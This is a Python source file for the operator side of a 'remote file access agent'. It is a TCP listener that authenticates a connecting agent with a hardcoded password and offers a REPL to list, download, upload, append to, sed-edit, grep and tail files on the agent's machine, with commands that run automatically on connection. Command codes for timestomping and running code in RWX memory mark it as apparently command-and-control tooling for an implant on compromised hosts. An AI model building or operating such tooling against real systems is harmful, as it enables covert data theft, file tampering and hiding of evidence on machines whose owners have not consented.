#!/usr/bin/env python3
"""
Server for remote file access agent.
Implements TCP server with REPL interface and password authentication.
"""

import socket
import struct
import sys
import select
import os
import shlex
from datetime import datetime
from pathlib import Path

# RPC Command constants
CMD_GET_FILE_STATS = 0x01
CMD_LS = 0x02
CMD_PWD = 0x03
CMD_DOWNLOAD_FILE = 0x04
CMD_BGREP = 0x05
CMD_TAILF = 0x06
CMD_CANCEL = 0x07
CMD_EXIT = 0x08
CMD_UPLOAD_FILE = 0x09
CMD_APPEND_FILE = 0x0A
CMD_TIMESTOMP = 0x0B
CMD_WC = 0x0C
CMD_DJB2SUM = 0x0D
CMD_SED = 0x0E
CMD_RUNRWX = 0x0F
CMD_PROC_MAPS = 0x10

# RPC Status constants
STATUS_OK = 0x00
STATUS_ERROR = 0x01
STATUS_MORE_DATA = 0x02

# RPC message sizes
RPC_REQUEST_SIZE = 4096
RPC_RESPONSE_SIZE = 4096
RPC_DATA_SIZE = 4088

# Authentication
AUTH_PASSWORD = bytes.fromhex("DEADBEEF")
AUTH_TIMEOUT = 2.0

# Global configuration
DOWNLOADS_DIR = "./downloads"


class RPCRequest:
    """RPC request structure"""

    def __init__(self, cmd_type, data):
        self.cmd_type = cmd_type
        self.data = data.encode("utf-8") if isinstance(data, str) else data

    def pack(self):
        """Pack request into bytes"""
        data_len = len(self.data)
        # struct format: B (uint8_t cmd), 3x (3 padding bytes), !I (uint32_t len in network byte order), data
        header = struct.pack("!B3xI", self.cmd_type, data_len)
        # Pad data to RPC_DATA_SIZE
        padded_data = self.data.ljust(RPC_DATA_SIZE, b"\x00")
        return header + padded_data


class RPCResponse:
    """RPC response structure"""

    @staticmethod
    def unpack(data):
        """Unpack response from bytes"""
        if len(data) != RPC_RESPONSE_SIZE:
            raise ValueError(
                f"Invalid response size: {len(data)} (expected {RPC_RESPONSE_SIZE})"
            )

        # struct format: B (uint8_t status), 3x (3 padding), !I (uint32_t len in network byte order)
        status, data_len = struct.unpack("!B3xI", data[:8])
        payload = data[8 : 8 + data_len]
        return status, payload


def send_request(sock, req):
    """Send RPC request to agent"""
    data = req.pack()
    sock.sendall(data)


def recv_response(sock):
    """Receive RPC response from agent"""
    data = b""
    while len(data) < RPC_RESPONSE_SIZE:
        chunk = sock.recv(RPC_RESPONSE_SIZE - len(data))
        if not chunk:
            raise ConnectionAbortedError("Connection closed by agent")
        data += chunk
    return RPCResponse.unpack(data)


def recv_exact(sock, size):
    """Receive exact number of bytes"""
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionAbortedError("Connection closed")
        data += chunk
    return data


def authenticate_agent(client_sock):
    """
    Wait for agent to send password within AUTH_TIMEOUT seconds.
    Returns True if authenticated, False otherwise.
    """
    print(f"Waiting for authentication (timeout: {AUTH_TIMEOUT}s)...")

    # Set socket timeout
    client_sock.settimeout(AUTH_TIMEOUT)

    try:
        # Receive password (fixed length)
        password = recv_exact(client_sock, len(AUTH_PASSWORD))

        if password == AUTH_PASSWORD:
            print("✓ Authentication successful")
            # Send success response (1 byte: 0x01)
            client_sock.sendall(b"\x01")
            # Remove timeout
            client_sock.settimeout(None)
            return True
        else:
            print(f"✗ Authentication failed: wrong password")
            print(f"  Expected: {AUTH_PASSWORD.hex()}")
            print(f"  Received: {password.hex()}")
            # Send failure response (1 byte: 0x00)
            client_sock.sendall(b"\x00")
            return False

    except socket.timeout:
        print("✗ Authentication timeout")
        return False
    except Exception as e:
        print(f"✗ Authentication error: {e}")
        return False


# ============================================================================
# REPL Command Handlers
# ============================================================================


def cmd_stats(sock, path):
    """Get file stats"""
    print(f"[*] Getting stats for: {path}")
    req = RPCRequest(CMD_GET_FILE_STATS, path)
    send_request(sock, req)
    status, data = recv_response(sock)

    if status == STATUS_OK:
        print(data.decode("utf-8", errors="ignore"))
    else:
        print(f"Error: {data.decode('utf-8', errors='ignore')}")


def cmd_ls(sock, path):
    """List directory"""
    print(f"[*] Listing directory: {path}")
    req = RPCRequest(CMD_LS, path)
    send_request(sock, req)
    status, data = recv_response(sock)

    if status == STATUS_OK:
        print(data.decode("utf-8", errors="ignore"))
    else:
        print(f"Error: {data.decode('utf-8', errors='ignore')}")


def cmd_pwd(sock):
    """Get current directory"""
    print("[*] Getting current directory...")
    req = RPCRequest(CMD_PWD, "")
    send_request(sock, req)
    status, data = recv_response(sock)

    if status == STATUS_OK:
        print(data.decode("utf-8", errors="ignore"))
    else:
        print(f"Error: {data.decode('utf-8', errors='ignore')}")


def sanitize_filename(path):
    """
    Sanitize filename to prevent directory traversal (LFI).
    Only keeps the basename and removes any path components.
    """
    # Get just the filename, stripping any directory components
    filename = os.path.basename(path)

    # Remove any remaining path traversal attempts
    filename = filename.replace("..", "").replace("/", "").replace("\\", "")

    # If empty after sanitization, use a default
    if not filename:
        filename = "downloaded_file"

    return filename


def cmd_download(sock, path):
    """Download file from agent"""
    print(f"[*] Downloading file: {path}")
    req = RPCRequest(CMD_DOWNLOAD_FILE, path)
    send_request(sock, req)

    # Receive chunks
    file_data = b""
    chunk_count = 0

    while True:
        status, data = recv_response(sock)

        if status == STATUS_ERROR:
            print(f"Error: {data.decode('utf-8', errors='ignore')}")
            return

        if status == STATUS_MORE_DATA:
            file_data += data
            chunk_count += 1
            print(
                f"  Received chunk {chunk_count}: {len(data)} bytes (total: {len(file_data)} bytes)",
                end="\r",
            )
        elif status == STATUS_OK:
            print(
                f"\n[+] Download complete: {len(file_data)} bytes in {chunk_count} chunks"
            )

            # Ensure downloads directory exists
            Path(DOWNLOADS_DIR).mkdir(parents=True, exist_ok=True)

            # Sanitize filename to prevent LFI
            filename = sanitize_filename(path)

            # Add timestamp to filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name_parts = os.path.splitext(filename)
            if name_parts[1]:  # Has extension
                timestamped_filename = f"{name_parts[0]}_{timestamp}{name_parts[1]}"
            else:
                timestamped_filename = f"{filename}_{timestamp}"

            save_path = os.path.join(DOWNLOADS_DIR, timestamped_filename)

            with open(save_path, "wb") as f:
                f.write(file_data)

            print(f"  Saved as: {save_path}")
            break


def cmd_bgrep(sock, path, pattern, is_hex=False):
    """Search file for binary pattern (auto-converts text to hex unless --hex flag used)"""

    if is_hex:
        # Validate hex pattern
        hex_pattern = pattern.lower()
        if len(hex_pattern) % 2 != 0:
            print(f"Error: Hex pattern must have even number of characters")
            return

        # Validate all characters are hex
        for c in hex_pattern:
            if c not in "0123456789abcdef":
                print(f"Error: Invalid hex character '{c}' in pattern")
                return

        print(f"[*] Searching '{path}' for hex pattern: {hex_pattern}")
    else:
        # Convert pattern to hex
        print(f"[*] Searching '{path}' for pattern: {pattern}")
        hex_pattern = pattern.encode("utf-8").hex()
        print(f"    Hex pattern: {hex_pattern}")

    # Pack: path\0hex_pattern
    args = path + "\x00" + hex_pattern
    req = RPCRequest(CMD_BGREP, args)
    send_request(sock, req)

    # Receive streaming results
    while True:
        status, data = recv_response(sock)

        if status == STATUS_ERROR:
            print(f"Error: {data.decode('utf-8', errors='ignore')}")
            break
        elif status == STATUS_MORE_DATA:
            # Print match results as they come
            sys.stdout.write(data.decode("utf-8", errors="ignore"))
            sys.stdout.flush()
        elif status == STATUS_OK:
            # Final message
            result = data.decode("utf-8", errors="ignore")
            if result:
                print(result)
            break


def cmd_tailf(sock, path):
    """Tail file continuously"""
    print(f"[*] Tailing file: {path}")
    print("    (Press Ctrl+C to cancel)")

    req = RPCRequest(CMD_TAILF, path)
    send_request(sock, req)

    try:
        while True:
            status, data = recv_response(sock)

            if status == STATUS_ERROR:
                print(f"Error: {data.decode('utf-8', errors='ignore')}")
                break

            if status == STATUS_MORE_DATA:
                # Print new data
                sys.stdout.write(data.decode("utf-8", errors="ignore"))
                sys.stdout.flush()
            elif status == STATUS_OK:
                # Tailf ended
                msg = data.decode("utf-8", errors="ignore")
                if msg:
                    print(f"\n{msg}")
                break

    except KeyboardInterrupt:
        print("\n[*] Sending cancel command...")
        try:
            cancel_req = RPCRequest(CMD_CANCEL, "")
            send_request(sock, cancel_req)
            # Wait for final response
            status, data = recv_response(sock)
            print(f"  {data.decode('utf-8', errors='ignore')}")
        except Exception as e:
            print(f"  Warning: {e}")


def cmd_upload(sock, local_path, remote_path):
    """Upload file to agent"""
    print(f"[*] Uploading '{local_path}' to agent path: {remote_path}")

    # Check if local file exists
    if not os.path.exists(local_path):
        print(f"Error: Local file '{local_path}' not found")
        return

    # Send initial request with remote path
    req = RPCRequest(CMD_UPLOAD_FILE, remote_path)
    send_request(sock, req)

    # Wait for ready response
    status, data = recv_response(sock)
    if status == STATUS_ERROR:
        print(f"Error: {data.decode('utf-8', errors='ignore')}")
        return

    print(f"  {data.decode('utf-8', errors='ignore')}")

    # Send file in chunks
    chunk_count = 0
    total_sent = 0

    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(RPC_DATA_SIZE)
            if not chunk:
                break

            # Send chunk
            chunk_req = RPCRequest(CMD_UPLOAD_FILE, chunk)
            send_request(sock, chunk_req)

            chunk_count += 1
            total_sent += len(chunk)
            print(
                f"  Sent chunk {chunk_count}: {len(chunk)} bytes (total: {total_sent} bytes)",
                end="\r",
            )

            # Wait for acknowledgment
            status, data = recv_response(sock)
            if status == STATUS_ERROR:
                print(f"\nError: {data.decode('utf-8', errors='ignore')}")
                return

    # Send final empty chunk to signal completion
    final_req = RPCRequest(CMD_UPLOAD_FILE, b"")
    send_request(sock, final_req)

    # Get final response
    status, data = recv_response(sock)
    if status == STATUS_OK:
        print(f"\n[+] {data.decode('utf-8', errors='ignore')}")
    else:
        print(f"\nError: {data.decode('utf-8', errors='ignore')}")


def cmd_append(sock, local_path, remote_path):
    """Append local file content to remote file on agent"""
    print(f"[*] Appending '{local_path}' to agent path: {remote_path}")

    # Check if local file exists
    if not os.path.exists(local_path):
        print(f"Error: Local file '{local_path}' not found")
        return

    # Send initial request with remote path
    req = RPCRequest(CMD_APPEND_FILE, remote_path)
    send_request(sock, req)

    # Wait for ready response
    status, data = recv_response(sock)
    if status == STATUS_ERROR:
        print(f"Error: {data.decode('utf-8', errors='ignore')}")
        return

    print(f"  {data.decode('utf-8', errors='ignore')}")

    # Send file in chunks
    chunk_count = 0
    total_sent = 0

    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(RPC_DATA_SIZE)
            if not chunk:
                break

            # Send chunk
            chunk_req = RPCRequest(CMD_APPEND_FILE, chunk)
            send_request(sock, chunk_req)

            chunk_count += 1
            total_sent += len(chunk)
            print(
                f"  Sent chunk {chunk_count}: {len(chunk)} bytes (total: {total_sent} bytes)",
                end="\r",
            )

            # Wait for acknowledgment
            status, data = recv_response(sock)
            if status == STATUS_ERROR:
                print(f"\nError: {data.decode('utf-8', errors='ignore')}")
                return

    # Send final empty chunk to signal completion
    final_req = RPCRequest(CMD_APPEND_FILE, b"")
    send_request(sock, final_req)

    # Get final response
    status, data = recv_response(sock)
    if status == STATUS_OK:
        print(f"\n[+] {data.decode('utf-8', errors='ignore')}")
    else:
        print(f"\nError: {data.decode('utf-8', errors='ignore')}")


def cmd_sed(sock, path, search, replace):
    """Perform find/replace on remote file and stream output"""
    print(f"[*] Running sed on: {path}")
    print(f"    Search:  '{search}'")
    print(f"    Replace: '{replace}'")

    # Pack arguments as: filename\0search\0replace
    args = (
        path.encode("utf-8")
        + b"\0"
        + search.encode("utf-8")
        + b"\0"
        + replace.encode("utf-8")
    )
    req = RPCRequest(CMD_SED, args)

    try:
        sock.sendall(req.pack())
    except ConnectionAbortedError:
        print("\n[x] Connection lost")
        return

    # Receive streaming output
    output_data = b""
    while True:
        status, data = recv_response(sock)

        if status == STATUS_ERROR:
            print(f"\n[x] Error: {data.decode('utf-8', errors='ignore')}")
            return
        elif status == STATUS_MORE_DATA:
            # Accumulate output
            output_data += data
        elif status == STATUS_OK:
            # Final chunk
            output_data += data
            break

    # Display the output
    print("=" * 60)
    print(output_data.decode("utf-8", errors="ignore"))
    print("=" * 60)


def cmd_help():
    """Show help"""
    print("""
Available commands:
  stats <path>                      - Get file statistics
  ls <path>                         - List directory contents
  pwd                               - Get current working directory
  download <path>                   - Download file from agent
  upload <local_path> <remote_path> - Upload local file to agent
  append <local_path> <remote_path> - Append local file to remote file on agent
  bgrep <path> <pattern>            - Search file for binary pattern (auto hex-encodes)
  bgrep --hex <path> <hex_pattern>  - Search with pre-encoded hex pattern (e.g. deadbeef)
  sed <path> <search> <replace>     - Find and replace text in file
  tailf <path>                      - Tail file continuously (Ctrl+C to cancel)
  help                              - Show this help
  exit                              - Exit and disconnect agent
""")


# ============================================================================
# REPL
# ============================================================================


def execute_command(sock, cmd):
    """Execute a single command. Returns True if should continue, False if should exit."""
    if not cmd:
        return True

    parts = shlex.split(cmd)
    cmd_name = parts[0].lower()

    if cmd_name == "exit":
        print("[*] Sending exit command...")
        req = RPCRequest(CMD_EXIT, "")
        send_request(sock, req)
        print("Goodbye!")
        return False

    elif cmd_name == "stats":
        if len(parts) >= 2:
            cmd_stats(sock, parts[1])

    elif cmd_name == "ls":
        if len(parts) >= 2:
            cmd_ls(sock, parts[1])

    elif cmd_name == "pwd":
        cmd_pwd(sock)

    elif cmd_name == "download":
        if len(parts) >= 2:
            cmd_download(sock, parts[1])

    elif cmd_name == "upload":
        if len(parts) >= 3:
            cmd_upload(sock, parts[1], parts[2])

    elif cmd_name == "append":
        if len(parts) >= 3:
            cmd_append(sock, parts[1], parts[2])

    elif cmd_name == "bgrep":
        # Support: bgrep <path> <pattern> OR bgrep --hex <path> <hex_pattern>
        if len(parts) >= 3:
            if parts[1] == "--hex":
                if len(parts) >= 4:
                    cmd_bgrep(sock, parts[2], parts[3], is_hex=True)
                else:
                    print("Usage: bgrep --hex <path> <hex_pattern>")
            else:
                cmd_bgrep(sock, parts[1], parts[2], is_hex=False)

    elif cmd_name == "sed":
        if len(parts) >= 4:
            cmd_sed(sock, parts[1], parts[2], parts[3])

    elif cmd_name == "tailf":
        if len(parts) >= 2:
            cmd_tailf(sock, parts[1])

    elif cmd_name == "help":
        cmd_help()

    else:
        print(f"Unknown command: {cmd_name}")
        print("Type 'help' for available commands")

    return True


def repl(sock, oncon_cmd=None, rc_file=None):
    """Interactive REPL for controlling agent"""
    print("\n" + "=" * 60)
    print("Connected to agent. Type 'help' for commands.")
    print("=" * 60)

    # Run RC file commands if provided
    if rc_file:
        print(f"\n[*] Running commands from RC file: {rc_file}")
        print("=" * 60)
        try:
            with open(rc_file, "r") as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    # Skip empty lines and comments
                    if not line or line.startswith("#"):
                        continue

                    print(f"\n[RC:{line_num}] {line}")
                    try:
                        should_continue = execute_command(sock, line)
                        if not should_continue:
                            return
                    except (
                        ConnectionError,
                        ConnectionAbortedError,
                        BrokenPipeError,
                    ) as e:
                        print(f"\n✗ Connection error during RC command: {e}")
                        print("Agent disconnected")
                        return
                    except Exception as e:
                        print(f"\n✗ Error during RC command: {e}")
                        import traceback

                        traceback.print_exc()

            print("\n" + "=" * 60)
            print("[*] RC file execution complete")
            print("=" * 60)
        except FileNotFoundError:
            print(f"✗ RC file not found: {rc_file}")
        except Exception as e:
            print(f"✗ Error reading RC file: {e}")

    # Run on-connect command if provided
    if oncon_cmd:
        print(f"\n[*] Running on-connect command: {oncon_cmd}")
        print("=" * 60)
        try:
            should_continue = execute_command(sock, oncon_cmd)
            if not should_continue:
                return
        except (ConnectionError, ConnectionAbortedError, BrokenPipeError) as e:
            print(f"\n✗ Connection error during on-connect command: {e}")
            print("Agent disconnected")
            return
        except Exception as e:
            print(f"\n✗ Error during on-connect command: {e}")
            import traceback

            traceback.print_exc()

        print("=" * 60)

    while True:
        try:
            cmd = input("\nagent> ").strip()
            should_continue = execute_command(sock, cmd)
            if not should_continue:
                break

        except KeyboardInterrupt:
            print("\nUse 'exit' command to quit")
        except (ConnectionError, ConnectionAbortedError, BrokenPipeError) as e:
            print(f"\n✗ Connection error: {e}")
            print("Agent disconnected")
            break
        except Exception as e:
            print(f"\n✗ Error: {e}")
            import traceback

            traceback.print_exc()


# ============================================================================
# Main Server
# ============================================================================


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Server for remote file access agent")
    parser.add_argument(
        "bind_ip", nargs="?", default="0.0.0.0", help="IP to bind to (default: 0.0.0.0)"
    )
    parser.add_argument("port", type=int, help="Port to listen on")
    parser.add_argument(
        "--oncon",
        type=str,
        help='Command to run automatically on connection (e.g., "ls /")',
    )
    parser.add_argument(
        "--rc",
        type=str,
        help="RC file with newline-separated commands to run on connection",
    )
    parser.add_argument(
        "--downloads-dir",
        type=str,
        default="./downloads",
        help="Directory to save downloaded files (default: ./downloads)",
    )

    args = parser.parse_args()

    port = args.port
    bind_ip = args.bind_ip
    oncon_cmd = args.oncon
    rc_file = args.rc

    # Set global downloads directory
    global DOWNLOADS_DIR
    DOWNLOADS_DIR = args.downloads_dir

    # Create TCP socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind to address
    try:
        server_sock.bind((bind_ip, port))
        server_sock.listen(5)
        print(f"[*] Server listening on {bind_ip}:{port}")
        print(f"[*] Password: {AUTH_PASSWORD.hex()}")
        print(f"[*] Waiting for agent connection...")
    except Exception as e:
        print(f"✗ Failed to bind: {e}")
        sys.exit(1)

    try:
        while True:
            # Accept connection
            client_sock, addr = server_sock.accept()
            print(f"\n[+] Agent connected from {addr[0]}:{addr[1]}")

            # Authenticate
            if not authenticate_agent(client_sock):
                print("[-] Authentication failed, closing connection")
                client_sock.close()
                continue

            # Launch REPL
            try:
                repl(client_sock, oncon_cmd, rc_file)
            except Exception as e:
                print(f"\n✗ Session error: {e}")
            finally:
                client_sock.close()
                print("\n[-] Connection closed")
                print("[*] Waiting for next agent connection...")

    except KeyboardInterrupt:
        print("\n\n[*] Server shutting down...")
    finally:
        server_sock.close()


if __name__ == "__main__":
    main()
